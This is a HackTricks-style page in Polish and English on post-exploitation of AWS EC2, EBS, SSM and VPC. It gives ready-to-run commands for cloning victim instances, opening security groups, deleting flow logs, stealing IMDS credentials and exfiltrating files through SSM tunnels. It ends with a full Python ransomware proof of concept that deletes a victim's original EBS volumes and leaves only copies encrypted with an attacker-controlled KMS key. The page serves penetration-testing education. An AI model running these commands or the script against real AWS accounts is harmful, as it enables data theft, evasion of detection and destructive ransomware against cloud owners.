# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Więcej informacji znajdziesz:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Złośliwy VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

Mirrorowanie ruchu VPC **duplikuje ruch przychodzący i wychodzący dla instancji EC2 w VPC** bez konieczności instalowania czegokolwiek na samych instancjach. Tak skopiowany ruch zwykle jest wysyłany do systemu wykrywania włamań sieciowych (IDS) w celu analizy i monitorowania.\
Napastnik mógłby to wykorzystać, aby przechwycić cały ruch i uzyskać z niego wrażliwe informacje:

Aby uzyskać więcej informacji, zobacz tę stronę:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Kopiowanie działającej instancji

Instancje zwykle zawierają różnego rodzaju wrażliwe informacje. Istnieją różne sposoby, żeby się do nich dostać (zobacz [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Innym sposobem, aby sprawdzić, co zawierają, jest **utworzenie AMI i uruchomienie z niego nowej instancji (nawet w swoim własnym koncie)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots są kopiami zapasowymi woluminów**, które zwykle zawierają **wrażliwe informacje**, dlatego ich sprawdzenie powinno ujawnić te dane.\
Jeśli znajdziesz **wolumin bez snapshotu** możesz: **utworzyć snapshot** i wykonać poniższe działania lub po prostu **zamontować go w instancji** w ramach konta:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Export an EC2 AMI straight to S3 using `CreateStoreImageTask` to obtain a raw disk image without snapshot sharing. This allows full offline forensics or data theft while leaving the instance networking untouched.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Dołącz wolumin Multi-Attach io1/io2 do drugiej instancji i zamontuj go w trybie tylko do odczytu, aby przechwycić dane na żywo bez tworzenia snapshotów. Przydatne, gdy wolumin ofiary ma już włączone Multi-Attach w tej samej AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Utwórz EC2 Instance Connect Endpoint, autoryzuj ingress i wstrzyknij tymczasowe klucze SSH, aby uzyskać dostęp do prywatnych instancji przez zarządzany tunel. Zapewnia szybkie ścieżki lateralnego poruszania się bez otwierania publicznych portów.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Przenieś sekundarny prywatny IP ENI ofiary na ENI kontrolowany przez atakującego, aby podszyć się pod zaufane hosty, które są allowlistowane po adresie IP. Umożliwia ominięcie wewnętrznych ACL lub reguł SG powiązanych z konkretnymi adresami.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Przypisz ponownie Elastic IP z instancji ofiary do atakującego, aby przechwytywać ruch przychodzący lub inicjować połączenia wychodzące, które wyglądają, jakby pochodziły z zaufanych publicznych adresów IP.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Jeśli reguła Security Group odwołuje się do customer-managed prefix list, dodanie CIDRów atakującego do tej listy cicho rozszerza dostęp we wszystkich zależnych regułach SG bez modyfikowania samej SG.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Utwórz gateway lub interface VPC endpoints, aby odzyskać dostęp wychodzący z izolowanych subnetów. Wykorzystanie AWS-managed private links omija brakujące kontrolki IGW/NAT, umożliwiając exfiltrację danych.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

An attacker with the ec2:AuthorizeSecurityGroupIngress permission can add inbound rules to security groups (for example, allowing tcp:80 from 0.0.0.0/0), thereby exposing internal services to the public Internet or to otherwise unauthorized networks.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
Atakujący posiadający uprawnienia ec2:ReplaceNetworkAclEntry (lub podobne) może zmodyfikować Network ACLs (NACLs) subnetu, aby uczynić je bardzo permissive — na przykład zezwalając 0.0.0.0/0 na krytycznych portach — eksponując cały zakres subnetu do Internetu lub do nieautoryzowanych segmentów sieci. W przeciwieństwie do Security Groups, które są stosowane per-instance, NACLs są stosowane na poziomie subnetu, więc zmiana restrykcyjnego NACL może mieć znacznie większy blast radius, umożliwiając dostęp do znacznie większej liczby hostów.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

Atakujący z uprawnieniami ec2:Delete* i iam:Remove* może usunąć krytyczne zasoby infrastruktury i konfiguracje — na przykład key pairs, launch templates/versions, AMIs/snapshots, volumes or attachments, security groups or rules, ENIs/network endpoints, route tables, gateways, or managed endpoints. Może to spowodować natychmiastowe przerwanie usług, utratę danych oraz utratę dowodów sądowych.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

Skieruj VPC Flow Logs do attacker-controlled S3 bucket, aby ciągle zbierać metadane sieciowe (source/destination, ports) poza kontem ofiary do długoterminowego rozpoznania.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Nawet jeśli zablokujesz EC2 tak, że żaden ruch nie może wyjść, nadal może **exfil via DNS**.

- **VPC Flow Logs will not record this**.
- Nie masz dostępu do AWS DNS logs.
- Wyłącz to ustawiając "enableDnsSupport" na false za pomocą:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Atakujący może wywołać API endpoints konta kontrolowanego przez siebie. Cloudtrail zapisze te wywołania, a atakujący będzie w stanie zobaczyć wyeksfiltrowane dane w logach Cloudtrail.

### Open Security Group

Możesz uzyskać dalszy dostęp do usług sieciowych, otwierając porty w taki sposób:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

It's possible to run an EC2 instance an register it to be used to run ECS instances and then steal the ECS instances data.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Nadużycie IMDS w ECS-on-EC2 i podszywanie się pod agenta ECS

A compromise inside any ECS task running on an EC2 container instance is typically enough to pivot into the host role and the IAM roles associated with all the other tasks in that node. Because there is **no task isolation for ECS-on-EC2**, every task can query the EC2 Instance Metadata Service (IMDS) by default, steal the container instance profile, and then talk the same WebSocket protocol that the ECS agent uses to the control plane (the **ECScape** primitive) to request the credentials for every task currently scheduled on that host. Latacora documented this workflow in their [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/), which the following offensive summary condenses.

#### Łańcuch ataku

1. **Steal the instance profile from inside the container.** Assume IMDSv2 is required, so request a token and then fetch the profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Use the container instance role to impersonate the ECS agent.** With those credentials you can speak the undocumented WebSocket channel the ECS agent uses; the control plane trusts you as the real agent and delivers **all task IAM credentials** to your process. You can now run higher-privileged tasks locally, dump task environment secrets, or update services/tasks to redeploy workloads you can fully inspect.

#### IMDS reachability with IMDSv2 + hop limit 1

Setting IMDSv2 with `HttpTokens=required` and `HttpPutResponseHopLimit=1` only blocks tasks that live behind an extra hop (Docker bridge). Other networking modes stay within one hop of the Nitro controller and still receive responses:

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Each task gets its own ENI that is still one hop away from IMDS, so tokens and metadata responses arrive successfully. |
| `host` | ✅ | Tasks share the host namespace, so they see the same hop distance as the EC2 instance. |
| `bridge` | ❌ | Responses die on the Docker bridge because that extra hop exhausts the hop limit. |

Dlatego **nigdy nie zakładaj, że hop limit 1 chroni workloady w trybie awsvpc lub host** — zawsze testuj z wnętrza swoich kontenerów.

#### Wykrywanie blokad IMDS w zależności od trybu sieciowego

- **awsvpc tasks:** Security groups, NACLs, lub modyfikacje routingu nie mogą zablokować link-local adresu 169.254.169.254, ponieważ Nitro wstrzykuje go na hoście. Sprawdź `/etc/ecs/ecs.config` pod kątem `ECS_AWSVPC_BLOCK_IMDS=true`. Jeśli flaga jest nieobecna (domyślnie) możesz wywołać IMDS bezpośrednio z zadania. Jeśli jest ustawiona, przemieść się do namespace hosta/agenta, aby ją odwrócić, lub uruchom swoje narzędzia poza awsvpc.

- **bridge mode:** Gdy żądania metadata zawodzą mimo ustawionego hop limit 1, obrońcy prawdopodobnie wstawili regułę drop w `DOCKER-USER`, na przykład `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`. Wylistowanie `iptables -S DOCKER-USER` to ujawnia, a dostęp roota pozwala usunąć lub zmienić kolejność reguły przed zapytaniem IMDS.

- **host mode:** Sprawdź konfigurację agenta pod kątem `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`. To ustawienie całkowicie usuwa role IAM dla zadań, więc musisz albo je ponownie włączyć, przejść na zadania awsvpc, albo wykraść poświadczenia przez inny proces na hoście. Gdy wartość jest `true` (domyślnie), każdy proces w trybie host — w tym skompromitowane kontenery — może odpytywać IMDS, chyba że zastosowano dedykowane filtry tc/eBPF/cgroup celujące w `169.254.169.254`; szukaj programów tc/eBPF lub reguł iptables odnoszących się do tego adresu.

Latacora even released [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) you can drop into a target account to enumerate which network modes still expose metadata and plan your next hop accordingly.

Once you understand which modes expose IMDS you can plan your post-exploitation path: target any ECS task, request the instance profile, impersonate the agent, and harvest every other task role for lateral movement or persistence inside the cluster.

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Wymagane uprawnienia:

- `ssm:StartSession`

Oprócz wykonywania poleceń, SSM umożliwia traffic tunneling, które można wykorzystać do pivoting z instancji EC2, które nie mają dostępu do sieci z powodu Security Groups lub NACLs.
Jednym ze scenariuszy, w którym jest to przydatne, jest pivoting z [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) do prywatnego klastra EKS.

> Aby rozpocząć sesję, musisz mieć zainstalowany SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Zainstaluj SessionManagerPlugin na swojej maszynie
2. Zaloguj się na Bastion EC2 używając następującego polecenia:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Pobierz tymczasowe poświadczenia Bastion EC2 AWS za pomocą skryptu [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Przenieś poświadczenia na swoją maszynę do pliku `$HOME/.aws/credentials` jako profil `[bastion-ec2]`
5. Zaloguj się do EKS jako Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Zaktualizuj pole `server` w pliku `$HOME/.kube/config`, aby wskazywało na `https://localhost`
7. Utwórz tunel SSM w następujący sposób:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Ruch z narzędzia `kubectl` jest teraz przekierowywany przez tunel SSM za pośrednictwem Bastion EC2 i możesz uzyskać dostęp do prywatnego klastra EKS ze swojego komputera, uruchamiając:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Zwróć uwagę, że połączenia SSL nie powiodą się, chyba że ustawisz flagę `--insecure-skip-tls-verify ` (lub jej odpowiednik w narzędziach audytowych K8s). Ponieważ ruch jest tunelowany przez bezpieczny tunel AWS SSM, jesteś chroniony przed wszelkiego rodzaju atakami MitM.

Na koniec, ta technika nie jest specyficzna dla atakowania prywatnych klastrów EKS. Możesz ustawić dowolne domeny i porty, aby pivotować do dowolnej innej usługi AWS lub niestandardowej aplikacji.

---

#### Szybkie lokalne ↔️ zdalne przekierowanie portu (AWS-StartPortForwardingSession)

Jeśli potrzebujesz tylko przekierować **jeden port TCP z instancji EC2 na swój lokalny host** możesz użyć dokumentu SSM `AWS-StartPortForwardingSession` (nie jest wymagany parametr zdalnego hosta):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
The command establishes a bidirectional tunnel between your workstation (`localPortNumber`) and the selected port (`portNumber`) on the instance **without opening any inbound Security-Group rules**.

Typowe zastosowania:

* **File exfiltration**
1. Na instance uruchom szybki HTTP server wskazujący na katalog, który chcesz exfiltrate:

```bash
python3 -m http.server 8000
```

2. Z twojej workstation pobierz pliki przez tunel SSM:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Dostęp do wewnętrznych aplikacji webowych (np. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Wskazówka: Skompresuj i zaszyfruj dowody przed ich eksfiltracją, aby CloudTrail nie rejestrował zawartości w postaci jawnego tekstu:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Udostępnij AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Wyszukiwanie wrażliwych informacji w publicznych i prywatnych AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel to narzędzie zaprojektowane do **wyszukiwania wrażliwych informacji w publicznych lub prywatnych Amazon Machine Images (AMIs)**. Automatyzuje proces uruchamiania instancji z docelowych AMIs, montowania ich woluminów oraz skanowania w poszukiwaniu potencjalnych sekretów lub wrażliwych danych.

### Udostępnianie EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Dowód koncepcji podobny do demonstracji Ransomware opisanej w notatkach dotyczących post-eksploatacji S3. KMS powinno zostać przemianowane na RMS (Ransomware Management Service), biorąc pod uwagę, jak łatwo można go użyć do szyfrowania różnych usług AWS.

Najpierw, z konta AWS 'attacker', utwórz customer managed key w KMS. W tym przykładzie pozwolę AWS na zarządzanie danymi klucza, ale w realistycznym scenariuszu złośliwy aktor zachowałby dane klucza poza kontrolą AWS. Zmień key policy, aby pozwolić dowolnemu AWS account Principal na użycie klucza. W przypadku tej key policy nazwa konta to 'AttackSim', a reguła polityki zezwalająca na pełen dostęp nazywa się 'Outside Encryption'.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Reguła polityki klucza wymaga włączenia następujących uprawnień, aby umożliwić jej użycie do zaszyfrowania wolumenu EBS:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Mając teraz publicznie dostępny klucz do użycia. Możemy użyć konta 'victim', które ma uruchomione kilka instancji EC2 z dołączonymi niezszyfrowanymi wolumenami EBS. Wolumeny EBS tego konta 'victim' są celem szyfrowania; ten atak zakłada przejęcie konta AWS o wysokich uprawnieniach.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Podobnie jak w przykładzie ransomware dla S3. Ten atak stworzy kopie dołączonych wolumenów EBS przy użyciu snapshots, użyje publicznie dostępnego klucza z konta 'attacker' do zaszyfrowania nowych wolumenów EBS, następnie odłączy oryginalne wolumeny EBS od instancji EC2 i je usunie, a na końcu usunie snapshots użyte do utworzenia nowo zaszyfrowanych wolumenów EBS. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

W efekcie w koncie pozostaną jedynie zaszyfrowane wolumeny EBS.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Warto też zauważyć, że skrypt zatrzymał instancje EC2, aby odłączyć i usunąć oryginalne wolumeny EBS. Oryginalne niezszyfrowane wolumeny zostały teraz usunięte.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Następnie wróć do polityki klucza na koncie 'attacker' i usuń regułę polityki 'Outside Encryption' z polityki klucza.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Poczekaj chwilę, aż nowo ustawiona polityka klucza się rozpowszechni. Następnie wróć do konta 'victim' i spróbuj dołączyć jeden z nowo zaszyfrowanych woluminów EBS. Zobaczysz, że możesz załączyć wolumin.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Ale kiedy spróbujesz faktycznie ponownie uruchomić instancję EC2 z zaszyfrowanym woluminem EBS, to się nie uda i instancja przejdzie ze stanu 'pending' z powrotem do stanu 'stopped' na zawsze, ponieważ dołączonego woluminu EBS nie da się odszyfrować przy użyciu klucza — polityka klucza już na to nie pozwala.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

To jest użyty skrypt python. Przyjmuje AWS creds dla konta 'victim' oraz publicznie dostępny AWS ARN klucza, który ma być użyty do szyfrowania. Skrypt wykona zaszyfrowane kopie WSZYSTKICH dostępnych woluminów EBS dołączonych do WSZYSTKICH instancji EC2 na docelowym koncie AWS, następnie zatrzyma każdą instancję EC2, odłączy oryginalne woluminy EBS, usunie je, a na końcu usunie wszystkie snapshots wykorzystane podczas procesu. To pozostawi jedynie zaszyfrowane woluminy EBS na docelowym koncie 'victim'. UŻYWAJ TEGO SKRYPTU TYLKO W ŚRODOWISKU TESTOWYM, JEST DESTRUKCYJNY I USUNIE WSZYSTKIE ORYGINALNE WOLUMINY EBS. Możesz je odzyskać używając wykorzystanego klucza KMS i przywrócić je do pierwotnego stanu za pomocą snapshots, ale chcę ci tylko uświadomić, że na końcu dnia jest to ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Źródła

- [Latacora - ECS on EC2: Pokrywanie luk we wzmacnianiu zabezpieczeń IMDS](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening repozytorium Terraform](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – Jak przesyłać pliki w AWS za pomocą SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
